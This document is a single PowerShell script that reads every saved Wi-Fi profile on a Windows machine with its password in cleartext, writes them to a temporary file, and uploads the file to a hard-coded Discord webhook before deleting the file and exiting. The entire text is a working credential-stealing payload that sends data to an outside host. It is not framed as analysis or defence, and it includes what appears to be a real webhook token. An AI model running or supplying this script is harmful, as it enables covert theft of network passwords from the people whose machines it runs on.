$discordWebhookUrl = "https://discord.com/api/webhooks/1167616641207636008/2fJyzwglvf0v9BwqaPqHFHxRgiyHKO0fm_cuCYemDBTnMJX5mAwQkdx45yatgJ2dZ62N"; $tempFile = New-Item -ItemType File -Force -Path $env:TEMP\Wi-FiData.txt; foreach ($profileName in (netsh wlan show profiles | Select-String -Pattern "All User Profile" | ForEach-Object { $_ -replace "^\s+All User Profile\s+:\s+", "" })) { $xmlData = (netsh wlan show profile name="$profileName" key=clear); $xmlData | Out-File -Append -FilePath $tempFile.FullName } $jsonPayload = '{"embeds":[{"title":"Wi-Fi Data","description":"See attached text file for Wi-Fi data."}]}'; $boundary=[System.Guid]::NewGuid().ToString(); $crlf="`r`n"; $bodyLines=(("--$boundary","Content-Disposition: form-data; name=`"file`"; filename=`"Wi-FiData.txt`"","Content-Type: text/plain","","$(Get-Content -Raw $tempFile.FullName)","--$boundary","Content-Disposition: form-data; name=`"payload_json`"","Content-Type: application/json","","$jsonPayload","--$boundary--")-join $crlf); $headers=@{"Content-Type"="multipart/form-data; boundary=$boundary"}; try { $response = Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Headers $headers -Body $bodyLines; Write-Host "Webhook response: $($response | ConvertTo-Json)"; } catch { Write-Host "An error occurred: $_" } finally { Remove-Item -Path $tempFile.FullName -Force; Exit; }